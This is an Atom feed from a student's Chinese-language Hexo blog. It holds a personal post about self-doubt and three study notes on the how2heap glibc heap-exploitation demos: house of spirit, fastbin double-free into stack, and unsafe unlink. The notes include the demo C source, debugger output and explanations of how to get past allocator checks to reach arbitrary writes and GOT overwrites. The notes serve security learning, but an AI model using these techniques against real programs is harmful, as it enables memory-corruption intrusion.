<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BOBpenのStudio</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-10-17T17:01:23.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>BOBpen</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2017/10/18/%E5%86%99%E5%9C%A8%E5%85%B6%E5%AE%9E%E4%B8%8D%E6%98%AF%E6%9C%80%E5%89%8D%E7%9A%84%E6%9C%80%E5%89%8D/"/>
    <id>http://yoursite.com/2017/10/18/写在其实不是最前的最前/</id>
    <published>2017-10-17T16:39:54.000Z</published>
    <updated>2017-10-17T17:01:23.000Z</updated>
    
    <content type="html"><![CDATA[<p> Nothing But Change</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>2017.10.19日凌晨。<br>电脑忘了充电，熄灯了。<br>还有11%的电</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>大二开学一个月了，人总是会莫名其妙地觉得好像心理丢失了什么。<br>台灯，漆黑的宿舍，只剩我一人还在床下。<br>11点和老哥的一次通话，    本来是谈学习问题，本来是不想讲多少的。莫名好像被触碰到了什么，总结过来就是从高中到现在都会有的瞬时性的，突然性的颓废感。自己的兴趣呢，自己的出发点呢。<br>仅仅开学一个月，我得到了三台可以说是在同学，甚至是大部分同龄人中最出色和最奢侈的装备了。可能父母想来我是需要的吧。辛苦的他们或许是对我的期望很高吧，还有老哥。<br>常常在想，是什么在作祟。老哥的期望，父母的期望，自己的期望。到头来，看似风光的背后却是捉襟见肘的水平。今天，10.19.<br>12:48.我敢真正说出口，大声说出口。我让你们失望了。可以说是水过来的。</p><p>敲文章敲的很吃力。因为真的很心虚，也害怕我只是又是一时感到的堕落和想认真奋斗。</p><p>浪费浪费了太多时间。</p><p>明明技术是最让我痴迷地。或许现在我可以扪心自问，真正让我痴迷吗。</p><p>也可能是课太多，实验太多了吧</p><p>有的时候在想，自己到底能给父母什么，自己到底能让无私帮助的老哥骄傲吗。</p><p>答案是什么，还是靠自己去努力吧</p><p>这篇文章应该是个起步吧。当我真正卖掉了游戏电脑，就好像是朝一种生活方式做一个几乎断绝的告别。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>想一个问题，自己到底是什么类型的学习份子，是任务驱动还是兴趣更多占据主导的兴趣使然。现在想来不要太过纠结，只要你是想变好。就行了，至于其他的，就随他去吧</p><p>希望自己能好好的。希望父母能好好的，希望在大学陪伴我的老哥能好好的。我真心希望你们都能好好的，不想让自己辜负你们。不仅让你们这么觉得，也要我自己能对自己满意。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; Nothing But Change&lt;/p&gt;
&lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;2017.10.19日凌晨。&lt;br&gt;电脑忘了充电，熄灯了。&lt;br&gt;还有
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2017/10/13/how2heap-serious-2/"/>
    <id>http://yoursite.com/2017/10/13/how2heap-serious-2/</id>
    <published>2017-10-13T05:32:32.000Z</published>
    <updated>2017-10-01T05:08:59.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>这篇文章是how2heap系列剩下的总结。</p><h2 id="0x01-house-of-spirit"><a href="#0x01-house-of-spirit" class="headerlink" title="0x01-house_of_spirit"></a>0x01-house_of_spirit</h2><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">printf(&quot;This file demonstrates the house of spirit attack.\n&quot;);</div><div class="line"></div><div class="line">printf(&quot;Calling malloc() once so that it sets up its memory.\n&quot;);</div><div class="line">malloc(1);</div><div class="line"></div><div class="line">printf(&quot;We will now overwrite a pointer to point to a fake &apos;fastbin&apos; region.\n&quot;);</div><div class="line">unsigned long long *a;</div><div class="line">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</div><div class="line">unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));</div><div class="line"></div><div class="line">printf(&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[7]);</div><div class="line"></div><div class="line">printf(&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;);</div><div class="line">printf(&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;);</div><div class="line">fake_chunks[1] = 0x40; // this is the size</div><div class="line"></div><div class="line">printf(&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;);</div><div class="line">        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</div><div class="line">fake_chunks[9] = 0x1234; // nextsize</div><div class="line"></div><div class="line">printf(&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;, &amp;fake_chunks[1]);</div><div class="line">printf(&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;);</div><div class="line">a = &amp;fake_chunks[2];</div><div class="line"></div><div class="line">printf(&quot;Freeing the overwritten pointer.\n&quot;);</div><div class="line">free(a);</div><div class="line"></div><div class="line">printf(&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]);</div><div class="line">printf(&quot;malloc(0x30): %p\n&quot;, malloc(0x30));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>很简单的一个利用构造来malloc出想要的地址的方法，其中，这里是在栈上构造堆。几个注意点记录一下。</p><ol><li><strong>attribute</strong> ((aligned (16))      指的是16字节对齐。</li><li>创建一个指针，指向伪造的chunk1部分，chunk1是一个伪造的fastbin块，free之后，在下次系统调用的时候就会返回这个地址，便达到了目的</li><li>chunk2的构造中的size需要过掉一些检查</li></ol><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;这篇文章是how2heap系列剩下的总结。&lt;/p&gt;
&lt;h2 id=&quot;0x01-house-of-spirit&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>&#39;how-heap-serious&#39;</title>
    <link href="http://yoursite.com/2017/09/23/how2heap-serious-1/"/>
    <id>http://yoursite.com/2017/09/23/how2heap-serious-1/</id>
    <published>2017-09-23T05:35:54.000Z</published>
    <updated>2017-09-24T16:36:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-first-fit"><a href="#0x01-first-fit" class="headerlink" title="0x01-first-fit"></a>0x01-first-fit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.</div><div class="line">glibc uses a first-fit algorithm to select a free chunk.</div><div class="line">If a chunk is free and large enough, malloc will select this chunk.</div><div class="line">This can be exploited in a use-after-free situation.</div><div class="line">Allocating 2 buffers. They can be large, don&apos;t have to be fastbin.</div><div class="line">1st malloc(512): 0x556e1bfa2420</div><div class="line">2nd malloc(256): 0x556e1bfa2630</div><div class="line">we could continue mallocing here...</div><div class="line">now let&apos;s put a string at a that we can read later &quot;this is A!&quot;</div><div class="line">first allocation 0x556e1bfa2420 points to this is A!</div><div class="line">Freeing the first one...</div><div class="line">We don&apos;t need to free anything again. As long as we allocate less than 512, it will end up at 0x556e1bfa2420</div><div class="line">So, let&apos;s allocate 500 bytes</div><div class="line">3rd malloc(500): 0x556e1bfa2420</div><div class="line">And put a different string here, &quot;this is C!&quot;</div><div class="line">3rd allocation 0x556e1bfa2420 points to this is C!</div><div class="line">first allocation 0x556e1bfa2420 points to this is C!</div><div class="line">If we reuse the first allocation, it now holds the data from the third allocation.</div></pre></td></tr></table></figure><p>编译过后，看到glibc用一种first-fit算法去选择分配一个块。用到这里可以UAF这个漏洞，但是我先不考虑这个。</p><p>总结就两点：<br>1.连续申请了两个堆块，free第一个之后，只要你继续申请的块的大小是小于这个512的话，就会返回chunk1开始的地址。<br>2，因此，如果改变了chunk3的值，会发现指针1（第一个chunk块）也指向了这个字符串</p><p>因此我们只要改写指针1的指向，就能改变指针3，验证一下。我再源码中最后加入了两行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">strcpy(a, &quot;this is A!&quot;);</div><div class="line">printf(&quot;first allocation %p points to %s\n&quot;, a, a);</div><div class="line">printf(&quot;3rd allocation %p points to %s\n&quot;, c, c);</div></pre></td></tr></table></figure></p><p>结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">first allocation 0x55d93d93f420 points to this is A!</div><div class="line">3rd allocation 0x55d93d93f420 points to this is A!</div></pre></td></tr></table></figure></p><p>看到，我改变了a的指向，当前的c的指向，又变回了this is A这个字符串<br>（这里提到的uaf，决定在总结完所有基础的知识后刷pwnable的题之后再详细写）</p><h2 id="0x02-fastbin-dup-into-stack"><a href="#0x02-fastbin-dup-into-stack" class="headerlink" title="0x02-fastbin_dup_into_stack"></a>0x02-fastbin_dup_into_stack</h2><p>这个部分是在上一个的基础上的延伸。<br>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">The address we want malloc() to return is 0x7fffffffe1d0.</div><div class="line">Allocating 3 buffers.</div><div class="line">1st malloc(8): 0x555555757420</div><div class="line">2nd malloc(8): 0x555555757440</div><div class="line">3rd malloc(8): 0x555555757460</div><div class="line">Freeing the first one...</div><div class="line">If we free 0x555555757420 again, things will crash because 0x555555757420 is at the top of the free list.</div><div class="line">So, instead, we&apos;ll free 0x555555757440.</div><div class="line">Now, we can free 0x555555757420 again, since it&apos;s not the head of the free list.</div><div class="line">Now the free list has [ 0x555555757420, 0x555555757440, 0x555555757420 ]. We&apos;ll now carry out our attack by modifying data at 0x555555757420.</div><div class="line">1st malloc(8): 0x555555757420</div><div class="line">2nd malloc(8): 0x555555757440</div><div class="line">Now the free list has [ 0x555555757420 ].</div><div class="line">Now, we have access to 0x555555757420 while it remains at the head of the free list.</div><div class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</div><div class="line">so that malloc will think there is a free chunk there and agree to</div><div class="line">return a pointer to it.</div><div class="line">Now, we overwrite the first 8 bytes of the data at 0x555555757420 to point right before the 0x20.</div></pre></td></tr></table></figure></p><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">printf(&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</div><div class="line">       &quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;);</div><div class="line"></div><div class="line">unsigned long long stack_var;</div><div class="line"></div><div class="line">printf(&quot;The address we want malloc() to return is %p.\n&quot;, 8+(char *)&amp;stack_var);</div><div class="line"></div><div class="line">printf(&quot;Allocating 3 buffers.\n&quot;);</div><div class="line">int *a = malloc(8);</div><div class="line">int *b = malloc(8);</div><div class="line">int *c = malloc(8);</div><div class="line"></div><div class="line">printf(&quot;1st malloc(8): %p\n&quot;, a);</div><div class="line">printf(&quot;2nd malloc(8): %p\n&quot;, b);</div><div class="line">printf(&quot;3rd malloc(8): %p\n&quot;, c);</div><div class="line"></div><div class="line">printf(&quot;Freeing the first one...\n&quot;);</div><div class="line">free(a);</div><div class="line"></div><div class="line">printf(&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</div><div class="line">// free(a);</div><div class="line"></div><div class="line">printf(&quot;So, instead, we&apos;ll free %p.\n&quot;, b);</div><div class="line">free(b);</div><div class="line"></div><div class="line">printf(&quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</div><div class="line">free(a);</div><div class="line"></div><div class="line">printf(&quot;Now the free list has [ %p, %p, %p ]. &quot;</div><div class="line">&quot;We&apos;ll now carry out our attack by modifying data at %p.\n&quot;, a, b, a, a);</div><div class="line">unsigned long long *d = malloc(8);</div><div class="line"></div><div class="line">printf(&quot;1st malloc(8): %p\n&quot;, d);</div><div class="line">printf(&quot;2nd malloc(8): %p\n&quot;, malloc(8));</div><div class="line">printf(&quot;Now the free list has [ %p ].\n&quot;, a);</div><div class="line">printf(&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</div><div class="line">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</div><div class="line">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</div><div class="line">&quot;return a pointer to it.\n&quot;, a);</div><div class="line">stack_var = 0x20;</div><div class="line"></div><div class="line">printf(&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a);</div><div class="line">*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</div><div class="line"></div><div class="line">printf(&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8));</div><div class="line">printf(&quot;4th malloc(8): %p\n&quot;, malloc(8));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>总结来说，这个程序想表达的就是通过fastbin的问题来达到malloc一个<strong>指定，可控</strong>地址的效果</p><p>这个地址可以是栈上的，也可以是堆的</p><p>重点其实就是伪造一个free-chunk，利用double-free来进行</p><p>这个地方的一个坑一开始没看懂，就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">printf(&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a);</div><div class="line">*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</div></pre></td></tr></table></figure></p><p>两个问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unsigned long long stack_var</div></pre></td></tr></table></figure><p>1.为什么向0x555555757420前8byte写   &amp;stack_var-8<br>2.为什么写0x20给stack_var</p><p>其实很简单</p><p>一.就是改fd，这样在malloc了第三次之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; fastbins </div><div class="line">fastbins</div><div class="line">0x20: 0x555555757410 —▸ 0x7fffffffe1c0 —▸ 0x555555757420 ◂— 0x0</div><div class="line">0x30: 0x0</div><div class="line">0x40: 0x0</div><div class="line">0x50: 0x0</div><div class="line">0x60: 0x0</div><div class="line">0x70: 0x0</div><div class="line">0x80: 0x0</div></pre></td></tr></table></figure></p><p> 0x7fffffffe1c0就到了fastbin的顶部，就是下一个待malloc的地址（这里注意，准确的说，是那个chunk的头地址，返回的是我们想指定的那个）</p><p>二.为什么写0x20，很简单，chunk的构造，四部分</p><p><img src="https://i.imgur.com/dnTKgir.jpg" alt=""><br>（图只是表示同一个人类型，具体的地址不同）</p><p>当前的chunk我们需要的是4*0x8=0x20的大小，所以成功构造了一个chunk再加上之前的写地址，这个chunk就会被malloc出啦！！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0x7fffffffe1c0 --&gt; 0x0 </div><div class="line">0008| 0x7fffffffe1c8 --&gt; 0x20 (&apos; &apos;)</div><div class="line">0016| 0x7fffffffe1d0 --&gt; 0x555555757420 --&gt; 0x7fffffffe1c0 --&gt; 0x0 </div><div class="line">0024| 0x7fffffffe1d8 --&gt; 0x555555757460 --&gt; 0x0</div></pre></td></tr></table></figure></p><p>看栈的状态，就是在栈上构造了这个chunk，当然，可以想到，0x555555757420又会被插入fast链</p><p><img src="https://i.imgur.com/y5QwIEp.png" alt=""></p><p>这里我想记录一下，写8byte的时候，是从红箭头写的，写入的8byte是黄箭头的，当然都是相对各自的chunk而言</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><pre><code>nothing</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-first-fit&quot;&gt;&lt;a href=&quot;#0x01-first-fit&quot; class=&quot;headerlink&quot; title=&quot;0x01-first-fit&quot;&gt;&lt;/a&gt;0x01-first-fit&lt;/h2&gt;&lt;figure class=&quot;highlight 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>how2heap-unlink</title>
    <link href="http://yoursite.com/2017/09/21/how2heap-unlink/"/>
    <id>http://yoursite.com/2017/09/21/how2heap-unlink/</id>
    <published>2017-09-21T09:49:54.000Z</published>
    <updated>2017-09-24T16:40:34.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>这是我的第一篇po文，大二成功转到了信息安全实验班，大一下接触的二进制，马马虎虎，希望从今天开始，能更加的脚踏实地，把每个环节都扎实下来，有所进步！</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>堆的unlink，其实最关键的就是两个指针互相写的过程，利用unlink这个双链表删除操作，达到目的。<br>1.最初的unlink，没有相关的检测机制，所以我们可以直接利用这个unlink宏来达成对got表的修改。<br>2，现在的unlink加入了一些保护机制，即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                     </div><div class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);</div></pre></td></tr></table></figure></p><p>对于二者，要检测是否相同因此就需要一个绕过，对于二者的不同，可以参照这篇文章<a href="http://wooyun.jozxing.cc/static/drops/tips-7326.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tips-7326.html</a></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>开始how2heap的例子，第一次我准备将我菜鸡般的gdb调试过程记录下，虽然程序编译后都给出了相应的结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line"></div><div class="line"></div><div class="line">uint64_t *chunk0_ptr;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">printf(&quot;Welcome to unsafe unlink 2.0!\n&quot;);</div><div class="line">printf(&quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;);</div><div class="line">printf(&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;);</div><div class="line">printf(&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;);</div><div class="line"></div><div class="line">int malloc_size = 0x80; //we want to be big enough not to use fastbins</div><div class="line">int header_size = 2;</div><div class="line"></div><div class="line">printf(&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;);</div><div class="line"></div><div class="line">chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0</div><div class="line">uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1</div><div class="line">printf(&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;, &amp;chunk0_ptr, chunk0_ptr);</div><div class="line">printf(&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;, chunk1_ptr);</div><div class="line"></div><div class="line">printf(&quot;We create a fake chunk inside chunk0.\n&quot;);</div><div class="line">--------</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>程序我简略了许多，（反正是自己的笔记）</p><p>堆的unlink文章我看了一些，在还没有真正实战的情况下，我觉得首要就是先找出一个全局可修改指针或自己构造（目前先这么理解）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ p chunk0_ptr</div><div class="line">$1 = (uint64_t *) 0x555555757420</div><div class="line">gdb-peda$ p &amp;chunk0_ptr</div><div class="line">$2 = (uint64_t **) 0x555555756050 &lt;chunk0_ptr&gt;</div></pre></td></tr></table></figure></p><p>可以看到Chunk0的所在位置和内存内容<br>而我们的构造，就是要以Chunk0(下文用B来指代)，为基准。<br>所以，这就关系到chunk的结构!<br><a href="http://security.pingan.com/static/upload/2eb47c85f5a863a5c2904e529c0409a6.png" target="_blank" rel="external"></a><br>分别为（64位下）0x8的prev_size和其他都是0x8！<br>所以构造<br>fd= 0x555555756050-0x18<br>bk=  0x555555756050-0x10<br>这样p-&gt;fd-&gt;bk==p-&gt;bk-&gt;fd==B这样就绕开了第一个检查<br>（这里在调试的时候第一次把断点下在free函数，出现一些小问题，后来直接list源代码，下在free那一行，不懂什么问题，记录一下）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/50gx 0x555555757420</div><div class="line">0x555555757420:0x00000000000000000x0000000000000008</div><div class="line">0x555555757430:0x00005555557560380x0000555555756040  #chunk0的fd，bk</div><div class="line">0x555555757440:0x00000000000000000x0000000000000000</div><div class="line">0x555555757450:0x00000000000000000x0000000000000000</div><div class="line">0x555555757460:0x00000000000000000x0000000000000000</div><div class="line">0x555555757470:0x00000000000000000x0000000000000000</div><div class="line">0x555555757480:0x00000000000000000x0000000000000000</div><div class="line">0x555555757490:0x00000000000000000x0000000000000000</div><div class="line">0x5555557574a0:0x00000000000000800x0000000000000090  #chunk1的头，注意最后三位是三个标志位，prev_inuse=0</div><div class="line">0x5555557574b0:0x00000000000000000x0000000000000000  #chunk1的返回指针</div><div class="line">0x5555557574c0:0x00000000000000000x0000000000000000</div><div class="line">0x5555557574d0:0x00000000000000000x0000000000000000</div><div class="line">0x5555557574e0:0x00000000000000000x0000000000000000</div><div class="line">0x5555557574f0:0x00000000000000000x0000000000000000</div><div class="line">0x555555757500:0x00000000000000000x0000000000000000</div><div class="line">0x555555757510:0x00000000000000000x0000000000000000</div><div class="line">0x555555757520:0x00000000000000000x0000000000000000</div><div class="line">0x555555757530:0x00000000000000000x0000000000020ad1</div><div class="line">0x555555757540:0x00000000000000000x0000000000000000</div><div class="line">0x555555757550:0x00000000000000000x0000000000000000</div><div class="line">0x555555757560:0x00000000000000000x0000000000000000</div><div class="line">0x555555757570:0x00000000000000000x0000000000000000</div><div class="line">0x555555757580:0x00000000000000000x0000000000000000</div><div class="line">0x555555757590:0x00000000000000000x0000000000000000</div><div class="line">0x5555557575a0:0x00000000000000000x0000000000000000</div></pre></td></tr></table></figure><p>（在源码中，就是写成chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);）即64位的size<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ p chunk1_ptr</div><div class="line">$3 = (uint64_t *) 0x5555557574b0</div></pre></td></tr></table></figure></p><p>看一下本身构造的用来free的chunk1，刚好复习了概念，chunk的返回指针与头部的不相等关系，在glibc中，其实chunk就是个结构体的概念，而所有的变量都是通过的偏移形成的，这在很多计算机应用是基本的偏移寻址（联想到微机），所以就有了下面的理解。</p><p>还需要关注另外两个验证，即以chunk1（fake chunk）为基准，考虑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chunksize(P) != prev_size (nextchunk(P)) == False</div></pre></td></tr></table></figure></p><p>即chunk1的next_chunk的prev_size要和chunk1的size相等，这里关注next_chunk怎么寻址到的，就是通过chunk1的size来偏移的，chunk1的size是0，所以最终等式就是0=0.（还没验证，先留个bug）</p><p>最后在free之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ p chunk0_ptr</div><div class="line">$3 = (uint64_t *) 0x555555756038</div></pre></td></tr></table></figure></p><p>（断点设在free函数之后，不然程序运行到底，额···&lt;萌新的记录&gt;）</p><p>所以只要向chunk0_ptr写，就可以把偏移3*0x8即第四个单位大小的任意地址写入任意东西</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>常用的利用方法思路，写入got表，再修改got或有list堆，即显示got地址，反正一堆balabala</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;这是我的第一篇po文，大二成功转到了信息安全实验班，大一下接触的二进制，马马虎虎，希望从今天开始，能更加的脚踏实地，把每个环
      
    
    </summary>
    
    
  </entry>
  
</feed>
